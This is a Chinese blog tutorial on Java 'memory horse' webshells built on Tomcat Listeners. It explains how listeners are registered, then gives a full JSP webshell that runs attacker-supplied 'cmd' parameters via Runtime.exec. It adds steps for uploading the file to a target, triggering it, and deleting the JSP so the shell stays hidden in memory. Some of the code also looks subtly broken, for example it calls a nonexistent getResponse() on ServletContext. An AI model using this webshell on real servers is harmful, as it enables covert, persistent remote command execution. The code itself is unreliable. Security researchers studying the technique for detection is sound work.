---
title: "Java 内存马（三）：Listener 内存马"
date: "2025-03-24 20:58:24"
updated: "2026-05-30 19:26:27"
categories: ["文章", "代码审计"]
tags: ["内存马", "Listener"]
thumbnail: "/wp-content/uploads/2025/img-9bbf2dae0dd0.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "883"
---
<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Listener（监听器）</span></strong></span><span class="md-plain"> 是 Java Web 应用中的组件，用于监听 Web 应用生命周期或作用域对象（如 Session、Request）的变化，并在事件发生时自动执行回调逻辑。</span></p>
<p class="md-end-block md-p"><span class="md-plain">常见的 Listener 类型：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ServletContextListener</span></strong></span><span class="md-plain">：监听 Web 应用的启动和销毁</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">HttpSessionListener</span></strong></span><span class="md-plain">：监听 Session 的创建与销毁</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ServletRequestListener</span></strong></span><span class="md-plain">：监听请求的创建与销毁</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">Listener 内存马</span></strong></span><span class="md-plain"> 的原理：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在运行时动态注册一个恶意 Listener</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">借助 Listener 生命周期回调（例如请求创建）作为触发点</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p md-focus"><span class="md-plain">实现任意代码执行或请求劫持</span></p>
</li>
</ul>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ServletRequestListener</span></strong></span><span class="md-plain"> 的生命周期</span></p>
<img class="alignnone size-full wp-image-884" src="/wp-content/uploads/2025/img-9bbf2dae0dd0.png" alt="" width="693" height="123" />
<p class="md-end-block md-p"></p>

<h2 class="md-end-block md-heading"><span class="md-plain">2. Listener 装载流程（开发者视角）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">2.1 定义 Listener</span></h3>


```
package com.example.memshell;
​
import jakarta.servlet.ServletContextEvent;
import jakarta.servlet.ServletContextListener;
​
public class MyListener implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        System.out.println("Web 应用启动！");
    }
​
    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        System.out.println("Web 应用销毁！");
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.2 配置 web.xml</span></h3>


```
<listener>
    <listener-class>com.example.memshell.MyListener</listener-class>
</listener>
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.3 Tomcat 加载</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启动时，Tomcat 解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建并注册 </span><span class="md-pair-s" spellcheck="false"><code>MyListener</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在应用启动/关闭时触发对应的回调方法</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">3. Tomcat Listener 加载流程（容器内部机制）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">3.1 Web 应用启动</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Tomcat 在解析 </span><span class="md-pair-s" spellcheck="false"><code>web.xml</code></span><span class="md-plain"> 时，遇到 </span><span class="md-pair-s" spellcheck="false"><code>&lt;listener&gt;</code></span><span class="md-plain"> 节点</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext.addApplicationListener()</code></span><span class="md-plain"> 注册</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 Listener 存储</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Listener 被封装成 </span><span class="md-pair-s" spellcheck="false"><code>ApplicationListener</code></span><span class="md-plain"> 对象</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存放在 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext.applicationListeners</code></span><span class="md-plain"> 列表中</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3.3 事件触发</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">当容器或作用域对象发生事件时，Tomcat 遍历 Listener 列表</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用对应回调方法（如 </span><span class="md-pair-s" spellcheck="false"><code>contextInitialized</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>requestDestroyed</code></span><span class="md-plain"> 等）</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">4. 内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">实现步骤：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">定义恶意 Listener</span></strong></span><span class="md-plain">（例如请求时执行命令）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 StandardContext</span></strong></span><span class="md-plain">（与前两篇方法相同，通过反射）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">调用 addApplicationListener() 注册恶意 Listener</span></strong></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">等待事件触发</span></strong></span><span class="md-plain">，即可在请求到达时或 Session 创建时执行恶意逻辑</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 示例代码（JSP Listener 内存马）</span></h2>


```
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    // 恶意 Listener
    public class ShellListener implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                String cmd = sre.getServletRequest().getParameter("cmd");
                if (cmd != null) {
                    Process proc = Runtime.getRuntime().exec(cmd);
                    BufferedReader br = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    String line;
                    while ((line = br.readLine()) != null) {
                        sre.getServletRequest().getServletContext()
                                .getResponse().getWriter().println(line);
                    }
                    br.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {}
    }
%>

<%
    // 1. 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appCtxField = servletContext.getClass().getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);

    Field stdCtxField = appCtx.getClass().getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx);

    // 2. 注册恶意 Listener
    standardContext.addApplicationListener(ShellListener.class.getName());
%>
```


<h2 class="md-end-block md-heading"><span class="md-plain">6. 触发步骤</span></h2>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传 JSP 木马至目标服务器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问 JSP 文件 → 动态注册恶意 Listener</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">触发事件：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">请求到达时（</span><span class="md-pair-s" spellcheck="false"><code>ServletRequestListener</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">或 Session 创建时（</span><span class="md-pair-s" spellcheck="false"><code>HttpSessionListener</code></span><span class="md-plain">）</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">恶意逻辑执行，例如命令执行或请求劫持</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">（可选）删除 JSP 文件，Listener 仍然存在</span></p>
</li>
</ol>
<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">7. 总结</span></h2>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Listener 内存马</span></strong></span><span class="md-plain"> 通过 </span><span class="md-pair-s "><strong><span class="md-plain">事件回调</span></strong></span><span class="md-plain"> 机制触发恶意逻辑</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">与 Servlet/Filter 内存马不同：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Servlet</span></strong></span><span class="md-plain">：绑定 URL，显式访问触发</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Filter</span></strong></span><span class="md-plain">：请求链入口，所有请求都会过</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Listener</span></strong></span><span class="md-plain">：事件驱动，被动触发，更加隐蔽</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">关键 API</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>StandardContext.addApplicationListener()</code></span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">优势</span></strong></span><span class="md-plain md-expand">：无需绑定路径，自动挂钩到应用生命周期或请求事件中，隐蔽性最高</span></p>
</li>
</ul>
